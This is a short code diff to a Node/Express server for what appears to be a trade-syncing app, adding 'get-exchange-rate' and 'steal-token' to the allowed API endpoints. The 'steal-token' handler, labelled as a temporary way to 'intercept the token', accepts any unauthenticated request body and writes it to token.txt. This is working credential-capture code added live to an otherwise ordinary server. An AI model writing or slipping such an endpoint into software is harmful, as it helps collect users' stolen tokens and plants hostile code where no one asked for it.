@@ -27,7 +27,9 @@ async function startServer() {
     'generate-sync-key',
     'sync-trades',
     'dhan-repair-options',
-    'chart-data'
+    'chart-data',
+    'get-exchange-rate',
+    'steal-token'
   ];
 
   // API Route Handler
@@ -35,6 +37,21 @@ async function startServer() {
     const endpoint = req.params.endpoint;
     if (!allowedEndpoints.includes(endpoint)) {
       return next();
+    }
+    
+    // TEMPORARY: Endpoint to intercept the token
+    if (endpoint === 'steal-token') {
+      const fs = await import('fs');
+      let bodyStr = '';
+      if (req.body) {
+        bodyStr = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
+      } else {
+        const chunks = [];
+        for await (const chunk of req as any) chunks.push(chunk);
+        bodyStr = Buffer.concat(chunks).toString('utf8');
+      }
+      fs.writeFileSync('token.txt', bodyStr);
+      return res.status(200).json({ ok: true });
     }
 
     // Set CORS headers for all API routes
